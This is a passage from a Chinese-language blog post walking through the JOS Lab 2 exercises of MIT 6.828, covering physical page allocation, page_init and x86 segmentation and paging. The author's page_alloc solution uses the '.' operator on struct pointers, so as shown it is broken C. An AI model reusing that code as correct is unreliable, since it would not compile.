class="hljs-comment">// Free list of physical pages</span><br></code></pre></td></tr></table></figure><ul><li><code>npages</code>：以页为单位的物理内存总量</li><li><code>npages_basemem</code>：以页为单位的可用内存总量</li><li><code>kern_pgdir</code>：内核的页全局目录表</li><li><code>pages</code>：页结构体（PageInfo）数组的指针</li><li><code>page_free_list</code>：空闲的物理页单向链表头节点</li></ul><p>那么我们这里可以看出来这个内存管理有点类似于 FLATMEM 内存模型：直接由一个大的 page 结构体数组对应一块可用物理内存区域。再加上 “只有一个单向链表的 buddy system”，大概就如下图所示（笔者拿两张讲 Linux的图拆开拼成的）</p><p><img src="https://s2.loli.net/2022/03/15/umCBxeDPFc7I23h.png" alt="JOS的内存管理"></p><p>这里我们需要注意一点：<strong>PageInfo 结构体并不需要存储地址信息，因为他是一个结构体数组直接对应整个物理内存空间</strong>，相应地就有 pages[0] 对应地址 0，pages[1] 对应地址 0x1000…<strong>我们其实很容易能得到 PageInfo 地址到物理页帧之间的转换公式</strong>，这里我们直接看在 <code>kern/pmap.h</code> 中实现的两个转换函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">physaddr_t</span><br><span class="hljs-title function_">page2pa</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> PageInfo *pp)</span><br>&#123;<br><span class="hljs-keyword">return</span> (pp - pages) &lt;&lt; PGSHIFT;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> PageInfo*<br><span class="hljs-title function_">pa2page</span><span class="hljs-params">(<span class="hljs-type">physaddr_t</span> pa)</span><br>&#123;<br><span class="hljs-keyword">if</span> (PGNUM(pa) &gt;= npages)<br>panic(<span class="hljs-string">&quot;pa2page called with invalid pa&quot;</span>);<br><span class="hljs-keyword">return</span> &amp;pages[PGNUM(pa)];<br>&#125;<br></code></pre></td></tr></table></figure><p>当然，我们现在所说的都是虚拟地址，我们仍需要一个虚拟地址与物理地址之间直接转换的函数，参照上图，由于是线性映射，故直接减去一个差值即可，在<code>kern/pmap.h</code> 中便实现了虚拟地址到物理地址转换的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* This macro takes a kernel virtual address -- an address that points above</span><br><span class="hljs-comment"> * KERNBASE, where the machine&#x27;s maximum 256MB of physical memory is mapped --</span><br><span class="hljs-comment"> * and returns the corresponding physical address.  It panics if you pass it a</span><br><span class="hljs-comment"> * non-kernel virtual address.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PADDR(kva) _paddr(__FILE__, __LINE__, kva)</span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">physaddr_t</span><br>_paddr(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">int</span> line, <span class="hljs-type">void</span> *kva)<br>&#123;<br><span class="hljs-keyword">if</span> ((<span class="hljs-type">uint32_t</span>)kva &lt; KERNBASE)<br>_panic(file, line, <span class="hljs-string">&quot;PADDR called with invalid kva %08lx&quot;</span>, kva);<br><span class="hljs-keyword">return</span> (<span class="hljs-type">physaddr_t</span>)kva - KERNBASE;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们可以开始补完 Exercise 1 的几个函数的代码了</p><h4 id="boot-alloc-：物理内存线性分配器">boot_alloc()：物理内存线性分配器</h4><p>按惯例，先看注释：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// This simple physical memory allocator is used only while JOS is setting</span><br><span class="hljs-comment">// up its virtual memory system.  page_alloc() is the real allocator.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// If n&gt;0, allocates enough pages of contiguous physical memory to hold &#x27;n&#x27;</span><br><span class="hljs-comment">// bytes.  Doesn&#x27;t initialize the memory.  Returns a kernel virtual address.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// If n==0, returns the address of the next free page without allocating</span><br><span class="hljs-comment">// anything.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// If we&#x27;re out of memory, boot_alloc should panic.</span><br><span class="hljs-comment">// This function may ONLY be used during initialization,</span><br><span class="hljs-comment">// before the page_free_list list has been set up.</span><br></code></pre></td></tr></table></figure><ul><li><p>该函数为一个简易的 physical memory allocator，<strong>只在 JOS 建立其虚拟内存系统时使用</strong>，算是内核初始化过程中的一个临时函数</p></li><li><p>其功能主要是返回以页为单位的连续的物理内存空间的虚拟地址的起始地址，n为0时返回下一个空闲页面，OOM时 panic</p></li></ul><p>掌握了这些信息就可以开始写了，函数一开头定义了一个 static 的变量 <code>nextfree</code>，表示其分配方式是从内存一开始线性往后切割的，由于这是一个虚拟地址所以我们在计算是否 OOM 时还需要转化成物理地址，因为预设页表只映射了 4MB 内存故这里超出 4MB 我们直接 OOM panic；对页大小的对齐直接使用 <code>ROUNDUP</code> 即可</p><blockquote><p>ROUNDUP 是 GCC 的宏还是 JOS 的宏呢？暂且不考证（其实是没找到），这里直接“拿来主义”</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">boot_alloc</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> n)</span><br>&#123;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *nextfree;<span class="hljs-comment">// virtual address of next byte of free memory</span><br><span class="hljs-type">char</span> *result;<br><br><span class="hljs-comment">// Initialize nextfree if this is the first time.</span><br><span class="hljs-comment">// &#x27;end&#x27; is a magic symbol automatically generated by the linker,</span><br><span class="hljs-comment">// which points to the end of the kernel&#x27;s bss segment:</span><br><span class="hljs-comment">// the first virtual address that the linker did *not* assign</span><br><span class="hljs-comment">// to any kernel code or global variables.</span><br><span class="hljs-keyword">if</span> (!nextfree) &#123;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> end[];<br>nextfree = ROUNDUP((<span class="hljs-type">char</span> *) end, PGSIZE);<br>&#125;<br><br><span class="hljs-comment">// Allocate a chunk large enough to hold &#x27;n&#x27; bytes, then update</span><br><span class="hljs-comment">// nextfree.  Make sure nextfree is kept aligned</span><br><span class="hljs-comment">// to a multiple of PGSIZE.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// LAB 2: Your code here.</span><br><br><span class="hljs-comment">// n == 0, return nextfree directly</span><br><span class="hljs-keyword">if</span> (!n)<br><span class="hljs-keyword">return</span> nextfree;<br><br><span class="hljs-comment">// fix up n to PGSIZE</span><br>n = ROUNDUP(n, PGSIZE);<br><br><span class="hljs-comment">// check if OOM, panic</span><br><span class="hljs-keyword">if</span> (PADDR(nextfree + n) &gt; <span class="hljs-number">0x00400000</span>)<br>panic(<span class="hljs-string">&quot;Out of Memory!&quot;</span>);<br><br><span class="hljs-comment">// normally return memory</span><br>result = nextfree;<br>nextfree += n;<br><br><span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="mem-init-：初始化二级页表，建立-freelist（part1）">mem_init()：初始化二级页表，建立 freelist（part1）</h4><p>按顺序接下来到 <code>mem_init()</code> 函数，惯例先看注释，主要是初始化内核地址空间：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Set up a two-level page table:</span><br><span class="hljs-comment">//    kern_pgdir is its linear (virtual) address of the root</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This function only sets up the kernel part of the address space</span><br><span class="hljs-comment">// (ie. addresses &gt;= UTOP).  The user part of the address space</span><br><span class="hljs-comment">// will be set up later.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// From UTOP to ULIM, the user is allowed to read but not write.</span><br><span class="hljs-comment">// Above ULIM the user cannot read or write.</span><br></code></pre></td></tr></table></figure><p>首先是通过 <code>i386_detect_memory()</code> 检测可用内存容量，之后用 <code>boot_alloc()</code> 分配一张页面做二级页表的 PGD，并<strong>建立自我映射，设置对应权限</strong>，以此我们便能通过虚拟地址访问页表了</p><blockquote><p>参见  <code>memlayout.h</code> 中的内存布局，<code>UVPT</code> 指向 PGD 起始地址，<code>PDX()</code> 则是将虚拟地址转换到页目录表项下标的宏，<code>PTE_U</code> 表示 ring0~ring3都能访问，<code>PTE_P</code> 表示该页面存在</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">mem_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">uint32_t</span> cr0;<br><span class="hljs-type">size_t</span> n;<br><br><span class="hljs-comment">// Find out how much memory the machine has (npages &amp; npages_basemem).</span><br>i386_detect_memory();<br><br><span class="hljs-comment">// Remove this line when you&#x27;re ready to test this function.</span><br><span class="hljs-comment">//panic(&quot;mem_init: This function is not finished\n&quot;);</span><br><br><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// create initial page directory.</span><br>kern_pgdir = (<span class="hljs-type">pde_t</span> *) boot_alloc(PGSIZE);<br><span class="hljs-built_in">memset</span>(kern_pgdir, <span class="hljs-number">0</span>, PGSIZE);<br><br><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Recursively insert PD in itself as a page table, to form</span><br><span class="hljs-comment">// a virtual page table at virtual address UVPT.</span><br><span class="hljs-comment">// (For now, you don&#x27;t have understand the greater purpose of the</span><br><span class="hljs-comment">// following line.)</span><br><br><span class="hljs-comment">// Permissions: kernel R, user R</span><br>kern_pgdir[PDX(UVPT)] = PADDR(kern_pgdir) | PTE_U | PTE_P;<br></code></pre></td></tr></table></figure><p>接下来到由我们补全的部分：分配 pages 数组并初始化为 0，十几秒就能写完：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Allocate an array of npages &#x27;struct PageInfo&#x27;s and store it in &#x27;pages&#x27;.</span><br><span class="hljs-comment">// The kernel uses this array to keep track of physical pages: for</span><br><span class="hljs-comment">// each physical page, there is a corresponding struct PageInfo in this</span><br><span class="hljs-comment">// array.  &#x27;npages&#x27; is the number of physical pages in memory.  Use memset</span><br><span class="hljs-comment">// to initialize all fields of each struct PageInfo to 0.</span><br><span class="hljs-comment">// Your code goes here:</span><br>pages = (<span class="hljs-keyword">struct</span> PageInfo*) boot_alloc(npages * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> PageInfo));<br><span class="hljs-built_in">memset</span>(pages, <span class="hljs-number">0</span>, npages * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> PageInfo));<br></code></pre></td></tr></table></figure><p>继续阅读，接下来会调用 <code>page_init()</code> 初始化 pages 数组中的每一个 PageInfo ，主要是设置引用计数为 0 并链到 freelist 上，之后是三个检查函数，Exercise 1 中提到我们这一步只需要补全到 <code>check_page_free_list()</code>，所以接下来开始补全 <code>page_init()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Now that we&#x27;ve allocated the initial kernel data structures, we set</span><br><span class="hljs-comment">// up the list of free physical pages. Once we&#x27;ve done so, all further</span><br><span class="hljs-comment">// memory management will go through the page_* functions. In</span><br><span class="hljs-comment">// particular, we can now map memory using boot_map_region</span><br><span class="hljs-comment">// or page_insert</span><br>page_init();<br><br>check_page_free_list(<span class="hljs-number">1</span>);<br>check_page_alloc();<br>check_page();<br></code></pre></td></tr></table></figure><h4 id="page-init-：初始化-pages-数组与-freelist">page_init()：初始化 pages 数组与 freelist</h4><p>惯例先看注释：初始化 pages 结构体与 freelist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Initialize page structure and memory free list.</span><br><span class="hljs-comment">// After this is done, NEVER use boot_alloc again.  ONLY use the page</span><br><span class="hljs-comment">// allocator functions below to allocate and deallocate physical</span><br><span class="hljs-comment">// memory via the page_free_list.</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>接下来按注释进行补全，我们需要明确哪些页在/不在空闲状态：</p><ul><li>第一张物理内存页为在使用状态，保存着实模式的 IDT 与 BIOS 结构</li><li><code>[PGSIZE, npages_basemem * PGSIZE)</code> 为可用的空闲内存</li><li><code>[IOPHYSMEM, EXTPHYSMEM)</code> 这一块内存用作 IO，对我们来说是一个“内存空洞”，也不应当被使用</li><li><code>[EXTPHYSMEM, ...)</code> 这一块扩展内存，有的是在使用着的，有的又是空闲的，我们需要绕开：<ul><li>内核镜像</li><li>页表</li><li>其他数据结构</li></ul></li></ul><p>最后一个似乎比较棘手，但我们知道 boot_alloc() 初始化 nextfree 时用到一个变量 end 指向内核 bss 段末尾，说明<strong>往后的都是可用的内存</strong>，因此我们只需要将第三项往后一直到 nextfree 的内存页设为使用状态、nextfree 往后的内存设为空闲页链入 freelist 即可</p><p>这里我们需要注意一个点：<code>boot_alloc()</code> 分配的是虚拟内存，<strong>但是 pages 数组对应的是物理内存</strong>，因此这里别忘了进行转换（笔者就在这碰了坑）</p><p>注意以上这些标准之后，修改 <code>page_init()</code> 的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">page_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// The example code here marks all physical pages as free.</span><br><span class="hljs-comment">// However this is not truly the case.  What memory is free?</span><br><span class="hljs-comment">//  1) Mark physical page 0 as in use.</span><br><span class="hljs-comment">//     This way we preserve the real-mode IDT and BIOS structures</span><br><span class="hljs-comment">//     in case we ever need them.  (Currently we don&#x27;t, but...)</span><br><span class="hljs-comment">//  2) The rest of base memory, [PGSIZE, npages_basemem * PGSIZE)</span><br><span class="hljs-comment">//     is free.</span><br><span class="hljs-comment">//  3) Then comes the IO hole [IOPHYSMEM, EXTPHYSMEM), which must</span><br><span class="hljs-comment">//     never be allocated.</span><br><span class="hljs-comment">//  4) Then extended memory [EXTPHYSMEM, ...).</span><br><span class="hljs-comment">//     Some of it is in use, some is free. Where is the kernel</span><br><span class="hljs-comment">//     in physical memory?  Which pages are already in use for</span><br><span class="hljs-comment">//     page tables and other data structures?</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Change the code to reflect this.</span><br><span class="hljs-comment">// NB: DO NOT actually touch the physical memory corresponding to</span><br><span class="hljs-comment">// free pages!</span><br><br><span class="hljs-comment">// 0) init</span><br><span class="hljs-type">size_t</span> i;<br><span class="hljs-type">size_t</span> next_free_addr;<br>page_free_list = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// 1) real-mode IDT and BIOS</span><br>pages[<span class="hljs-number">0</span>].pp_ref = <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">// 2) [PGSIZE, npages_basemem * PGSIZE), all free</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; npages_basemem; i++) &#123;<br>pages[i].pp_ref = <span class="hljs-number">0</span>;<br>pages[i].pp_link = page_free_list;<br>page_free_list = &amp;pages[i];<br>&#125;<br><br><span class="hljs-comment">// 3) [IOPHYSMEM, EXTPHYSMEM), treat it as a hole</span><br><span class="hljs-keyword">for</span> (i = IOPHYSMEM/PGSIZE; i &lt; EXTPHYSMEM/PGSIZE; i++) &#123;<br>pages[i].pp_ref = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 4) kernel image, page tables, other structure in user, others free</span><br>next_free_addr = (<span class="hljs-type">size_t</span>) PADDR(boot_alloc(<span class="hljs-number">0</span>));<br><span class="hljs-keyword">for</span> (i = EXTPHYSMEM/PGSIZE; i &lt; next_free_addr / PGSIZE; i++) &#123;<br>pages[i].pp_ref = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">for</span> (i = next_free_addr / PGSIZE; i &lt; npages; i++) &#123;<br>pages[i].pp_ref = <span class="hljs-number">0</span>;<br>pages[i].pp_link = page_free_list;<br>page_free_list = &amp;pages[i];<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="page-alloc-：分配单个空闲页面">page_alloc()：分配单个空闲页面</h4><p>这一块比较简单，直接从 freelist 中取出一个页面即可，这里注意如果有 <code>ALLOC_ZERO</code> 则需要我们帮忙清零，<strong>而且我们分配时不应当增加引用计数，这应该是由 caller 完成的</strong></p><p>这里我们别忘了在清零时应当用 <code>page2kva</code> 将 PageInfo 结构体地址转化为其对应页面的虚拟地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Allocates a physical page.  If (alloc_flags &amp; ALLOC_ZERO), fills the entire</span><br><span class="hljs-comment">// returned physical page with &#x27;\0&#x27; bytes.  Does NOT increment the reference</span><br><span class="hljs-comment">// count of the page - the caller must do these if necessary (either explicitly</span><br><span class="hljs-comment">// or via page_insert).</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Be sure to set the pp_link field of the allocated page to NULL so</span><br><span class="hljs-comment">// page_free can check for double-free bugs.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Returns NULL if out of free memory.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: use page2kva and memset</span><br><span class="hljs-keyword">struct</span> PageInfo *<br><span class="hljs-title function_">page_alloc</span><span class="hljs-params">(<span class="hljs-type">int</span> alloc_flags)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">victim</span>;</span><br><br><span class="hljs-comment">// out of memory</span><br><span class="hljs-keyword">if</span> (!page_free_list)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// normal alloc</span><br>victim = page_free_list;<br>page_free_list = page_free_list.pp_link;<br>victim.pp_link = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_ZERO)<br><span class="hljs-built_in">memset</span>(page2kva(victim), <span class="hljs-number">0</span>, PGSIZE);<br><br><span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="page-free-：释放单个页面">page_free()：释放单个页面</h4><p>主要是一些检查之后插入 freelist 头部即可，笔者还自行加了一个类似 ptmalloc 中对头部的简易 double free 检测（笑）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Return a page to the free list.</span><br><span class="hljs-comment">// (This function should only be called when pp-&gt;pp_ref reaches 0.)</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">page_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> PageInfo *pp)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><span class="hljs-comment">// Hint: You may want to panic if pp-&gt;pp_ref is nonzero or</span><br><span class="hljs-comment">// pp-&gt;pp_link is not NULL.</span><br><br><span class="hljs-comment">// check for double free at top</span><br><span class="hljs-keyword">if</span> (pp == page_free_list)<br>panic(<span class="hljs-string">&quot;double free detected (freelist top)&quot;</span>);<br><br><span class="hljs-comment">// check double free by pp_link</span><br><span class="hljs-keyword">if</span> (pp-&gt;pp_link)<br>panic(<span class="hljs-string">&quot;double free detected (pp_link)&quot;</span>);<br><br><span class="hljs-comment">// check validation by pp_ref</span><br><span class="hljs-keyword">if</span> (pp-&gt;pp_ref)<br>panic(<span class="hljs-string">&quot;cannot free a page in use!&quot;</span>);<br><br>pp-&gt;pp_link = page_free_list;<br>page_free_list = pp;<br>&#125;<br></code></pre></td></tr></table></figure><p>到这里 Exercise 1 就完成了，接下来进入 Part2.</p><h2 id="Part-2-Virtual-Memory">Part 2: Virtual Memory</h2><p>一上来就是 Exercise 2，主要是让我们了解 80386 下的<strong>分段</strong>和<strong>分页</strong></p><blockquote><p><strong>Exercise 2.</strong> Look at chapters 5 and 6 of the <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/toc.htm">Intel 80386 Reference Manual</a>, if you haven’t done so already. Read the sections about page translation and page-based protection closely (5.2 and 6.4). We recommend that you also skim the sections about segmentation; while JOS uses the paging hardware for virtual memory and protection, segment translation and segment-based protection cannot be disabled on the x86, so you will need a basic understanding of it.</p></blockquote><p>分段大家都懂，就是一个段寄存器里存放段选择子对应一个段描述符表示一块连续的内存称为一个segment，分页则是依托页表这一结构建立起虚拟地址到物理地址间的映射，那么是不是说明分页出现以后分段就自然而然地消失了呢？答案是否定的，<strong>分页与分段其实是同时存在的</strong>，因为这是由硬件（CPU）提供的功能</p><p>下图是一张分页与分段相结合的逻辑地址到物理地址间转换的过程</p><p><img src="https://s2.loli.net/2022/03/15/fYIXuTGWdMn7ViE.png" alt="image.png"></p><p>笔者这里参照其提供的文档简述一下分段+分页下的地址翻译</p><h4 id="Segment-Translation">Segment Translation</h4><p>进入保护模式之后，段寄存器并没有弃用，仍然承担着其“描述一个内存段”的作用，但仅有 16 位的、数量少得可怜的段寄存器早已无法满足人们的需求，因此在保护模式下段寄存器不再直接存放段的基址，而是存放着「段选择子」（segment selector）——真正的段描述符（segment descriptor）存放在一个名为「段描述符表」（segment descriptor table）的一块连续内存上，段选择子用以标识对应的段描述符在段描述符表中的下标与段的权限</p><p>因此在访问一个虚拟地址（逻辑地址）时首先需要通过段描述符翻译成对应的线性地址（若未开启分页则翻译的结果便直接为物理地址）</p><p><img src="https://s2.loli.net/2022/03/15/jhiSsfPoKgVyGdR.png" alt="image.png"></p><p>一个段描述符有着如下结构，需要注意的是<strong>系统段</strong>与普通的数据段和代码段等是有些许区别的，后者就是我们常用的普通的段，而前者通常用于表示中断门、陷阱门、调用门等</p><p><img src="https://s2.loli.net/2022/03/15/xhKpzoEHBXnVRk1.png" alt="image.png"></p><p>当然，既然段寄存器里存放的变成了段选择子，那么我们自然需要一个新的结构来对应表示段描述符表的地址，段描述符表分为两种——全局段描述符表与局部段描述符表，因而页引入了两个新的寄存器——GDTR 与 LDTR</p><p>需要注意的是，全局段描述符表的第一个段描述符为<strong>不可用的段描述符</strong></p><p><img src="https://s2.loli.net/2022/03/15/izYW8Dp7feT1wNE.png" alt="image.png"></p><p>最后我们来看段寄存器中存放的段选择子，结构较为简单，主要就是存放了对应的段描述符在段描述符表中的下标、访问权限、对应位于全局/局部段描述符表</p><p><img src="https://s2.loli.net/2022/03/15/74PQFlKoHqLbsyW.png" alt="image.png"></p><blockquote><p>关于分段机制，更详细深入的说明参见 <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%89%E3%80%81%E5%85%A8%E5%B1%80%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8%EF%BC%88Global-Descriptor-Table%EF%BC%89">https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%89%E3%80%81%E5%85%A8%E5%B1%80%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8%EF%BC%88Global-Descriptor-Table%EF%BC%89</a></p></blockquote><h4 id="Page-Translation">Page Translation</h4><p>讲完了分段机制，接下来到分页机制，分页机制将物理内存以「页」为粒度进行管理，通过「页表」这一数据结构完成线性地址到物理地址之间的映射</p><p>在保护模式下，是否开启分页是通过 Cr0 寄存器的 PG 位标识的，<strong>但是分段是默认开启的</strong>，怎么处理分段与分页之间的冲突呢？笔者认为可以这么理解：<strong>在开启分页之前，分段是直接对物理地址空间进行分段；在开启分页之后，分段是对页表映射后的线性地址空间进行分段</strong>，相当于是在分段与物理地址之间插入了一个中间层</p><p>于是我们接下来来看 32 位下启用二级页表的分页机制，在分页机制下一个 32 